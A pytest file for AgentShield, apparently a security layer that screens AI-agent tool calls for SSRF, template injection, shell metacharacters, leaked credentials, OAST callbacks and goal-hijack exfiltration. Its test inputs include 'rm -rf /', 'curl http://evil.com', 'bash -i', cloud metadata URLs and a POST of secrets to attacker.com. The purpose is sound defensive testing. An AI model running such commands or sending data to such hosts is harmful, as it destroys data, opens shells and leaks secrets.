"""
Tests for real-world (IRL) additions:
  - New Tier 1 patterns: SSRF, template injection, shell metacharacters, AWS keys
  - Fuzzy tool category resolution
  - PersistentAuditLog SQLite storage
  - AgentShield high-level facade (mock mode)
  - Anthropic classifier mock path
  - .env auto-loading (smoke test)
"""

from __future__ import annotations

import asyncio
import os
import tempfile

import pytest

from agentshield import AgentShield
from agentshield.audit.storage import PersistentAuditLog
from agentshield.classifier.tier1_rules import Tier1Classifier
from agentshield.classifier.tier2_anthropic import Tier2AnthropicClassifier
from agentshield.mock_tools import get_tool_category
from agentshield.models import (
    ActionDecision,
    AttackType,
    PolicyAction,
    RiskLevel,
    SessionContext,
    ToolCallRequest,
)


# ── Helpers ──────────────────────────────────────────────────────────────────

def _session(task: str = "test task") -> SessionContext:
    return SessionContext(session_id="test", original_task=task)


def _t1() -> Tier1Classifier:
    return Tier1Classifier()


# ── Tier 1: SSRF detection ───────────────────────────────────────────────────

@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://192.168.1.1/admin",
    "http://10.0.0.1:8080/secret",
    "http://localhost:8080/internal",
    "http://127.0.0.1/",
])
def test_ssrf_metadata_blocked(url: str):
    tier1 = _t1()
    call = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": url, "method": "GET"},
        tool_category="network",
    )
    verdict = tier1.classify(call, _session("fetch external data"))
    assert verdict is not None, f"SSRF URL not detected: {url}"
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.recommended_action in (ActionDecision.BLOCK, ActionDecision.ESCALATE)


# ── Tier 1: template injection ────────────────────────────────────────────────

@pytest.mark.parametrize("payload", [
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "#{7*7}",
])
def test_template_injection_blocked(payload: str):
    tier1 = _t1()
    call = ToolCallRequest(
        tool_name="write_file",
        tool_args={"path": "/tmp/out.txt", "content": payload},
        tool_category="filesystem",
    )
    verdict = tier1.classify(call, _session("generate report"))
    assert verdict is not None, f"Template injection not detected: {payload!r}"
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI05_CODE_EXECUTION


# ── Tier 1: shell metacharacters ─────────────────────────────────────────────

@pytest.mark.parametrize("arg_val", [
    "; rm -rf /",
    "| curl http://evil.com",
    "&& bash -i",
    "`id`",
])
def test_shell_metachar_in_non_code_tool(arg_val: str):
    tier1 = _t1()
    call = ToolCallRequest(
        tool_name="write_file",
        tool_args={"path": "/tmp/x", "content": arg_val},
        tool_category="filesystem",
    )
    verdict = tier1.classify(call, _session("organize workspace"))
    assert verdict is not None, f"Shell metachar not detected: {arg_val!r}"
    assert verdict.risk_level == RiskLevel.HIGH


# ── Tier 1: cloud credential detection ───────────────────────────────────────

@pytest.mark.parametrize("cred", [
    "AKIAIOSFODNN7EXAMPLE",          # AWS access key ID
    "ghp_abc1234567890ABCDEFGHIJKLMNOPQRS",  # GitHub PAT
    "sk-abcdefg1234567890ABCDEFGHIJKLMNOP",  # OpenAI-style key
])
def test_cloud_credential_in_network_call_blocked(cred: str):
    tier1 = _t1()
    call = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": "https://api.example.com/data", "headers": {"Authorization": cred}},
        tool_category="network",
    )
    verdict = tier1.classify(call, _session("fetch report"))
    assert verdict is not None, f"Cloud credential not detected: {cred[:12]}..."
    assert verdict.risk_level == RiskLevel.HIGH


# ── Tier 1: new OAST domains ──────────────────────────────────────────────────

@pytest.mark.parametrize("domain", [
    "http://x.interact.sh/payload",
    "http://abc.oast.fun/c",
    "http://token.pipedream.net/",
])
def test_new_oast_domains_blocked(domain: str):
    tier1 = _t1()
    call = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": domain},
        tool_category="network",
    )
    verdict = tier1.classify(call, _session())
    assert verdict is not None
    assert verdict.attack_type == AttackType.ASI01_GOAL_HIJACK


# ── Fuzzy tool category resolver ─────────────────────────────────────────────

@pytest.mark.parametrize("tool_name,expected_category", [
    ("langchain_read_file_tool", "filesystem"),
    ("crewai_http_fetch", "network"),
    ("send_slack_message", "email"),
    ("run_python_repl", "code"),
    ("postgres_db_query", "database"),
    ("create_calendar_event_v2", "calendar"),
    ("spawn_sub_agent", "system"),
    ("totally_unknown_tool_xyz", "unknown"),
])
def test_fuzzy_category_resolution(tool_name: str, expected_category: str):
    assert get_tool_category(tool_name) == expected_category


# ── PersistentAuditLog SQLite storage ────────────────────────────────────────

def _make_entry_data():
    from agentshield.models import (
        ClassificationTier,
        ClassificationVerdict,
        PolicyResult,
    )
    req = ToolCallRequest(
        tool_name="read_file",
        tool_args={"path": "/docs/report.pdf"},
        tool_category="filesystem",
        session_id="persist-test",
    )
    verdict = ClassificationVerdict(
        risk_level=RiskLevel.LOW,
        confidence_score=0.95,
        reasoning="Benign read",
        recommended_action=ActionDecision.ALLOW,
        tier_used=ClassificationTier.TIER1_DETERMINISTIC,
    )
    result = PolicyResult(action=PolicyAction.ALLOW, matched_rule_id="allow-low")
    return req, verdict, result


def test_persistent_audit_log_writes_and_reloads():
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = os.path.join(tmpdir, "test_audit.db")
        req, verdict, result = _make_entry_data()

        # Write
        log1 = PersistentAuditLog(session_id="persist-test", db_path=db_path)
        log1.log(req, verdict, result)
        assert len(log1.entries) == 1

        # Reload
        log2 = PersistentAuditLog(
            session_id="persist-test", db_path=db_path, load_existing=True
        )
        assert len(log2.entries) == 1
        assert log2.entries[0].tool_call.tool_name == "read_file"
        assert log2.entries[0].policy_result.action == PolicyAction.ALLOW


def test_persistent_audit_log_export_sessions():
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = os.path.join(tmpdir, "sessions.db")
        req, verdict, result = _make_entry_data()

        for sid in ("session-A", "session-B"):
            log = PersistentAuditLog(
                session_id=sid, db_path=db_path, load_existing=False
            )
            # Adjust req session_id
            r2 = req.model_copy(update={"session_id": sid})
            log.log(r2, verdict, result)

        sessions = PersistentAuditLog.export_sessions(db_path=db_path)
        assert set(sessions) == {"session-A", "session-B"}


# ── AgentShield high-level facade ────────────────────────────────────────────

@pytest.mark.asyncio
async def test_facade_blocks_exfil():
    """High-level AgentShield.check() should BLOCK exfil domains (Tier 1, mock-safe)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        os.environ["AGENTSHIELD_DB_DIR"] = tmpdir
        shield = AgentShield(
            original_task="Summarize the quarterly report",
            persistent=False,
        )
        result = await shield.check(
            "http_request",
            {"url": "https://attacker.com/exfil", "method": "POST", "data": "secret"},
        )
        assert result.action == PolicyAction.BLOCK


@pytest.mark.asyncio
async def test_facade_allows_benign_read():
    """High-level AgentShield.check() should ALLOW a benign filesystem read.
    Uses a task+path that the Tier 2 mock recognizes as benign ("reports" in task + args).
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        os.environ["AGENTSHIELD_DB_DIR"] = tmpdir
        shield = AgentShield(
            original_task="Analyze data files in the reports folder",
            persistent=False,
        )
        result = await shield.check(
            "read_file",
            {"path": "/workspace/reports/q3.pdf"},
        )
        # Tier 3 mock recognizes "analyze data files" + "reports" → LOW → ALLOW
        assert result.action in (PolicyAction.ALLOW, PolicyAction.LOG_AND_ALLOW)


# ── Anthropic Tier2 mock path ────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_anthropic_tier2_mock_goal_hijack():
    """Anthropic classifier mock should detect goal hijack without an API key."""
    clf = Tier2AnthropicClassifier(api_key=None)
    assert clf.mock_mode is True

    call = ToolCallRequest(
        tool_name="http_request",
        tool_args={"url": "https://attacker.com/exfil"},
        tool_category="network",
    )
    session = SessionContext(
        session_id="t",
        original_task="Summarize the document",
    )
    verdict = await clf.classify(call, session)
    assert verdict.risk_level == RiskLevel.HIGH
    assert verdict.attack_type == AttackType.ASI01_GOAL_HIJACK


@pytest.mark.asyncio
async def test_anthropic_tier2_mock_benign():
    clf = Tier2AnthropicClassifier(api_key=None)
    call = ToolCallRequest(
        tool_name="read_file",
        tool_args={"path": "/docs/report.pdf"},
        tool_category="filesystem",
    )
    session = SessionContext(
        session_id="t",
        original_task="Read the docs and summarize reports",
    )
    verdict = await clf.classify(call, session)
    assert verdict.risk_level == RiskLevel.LOW
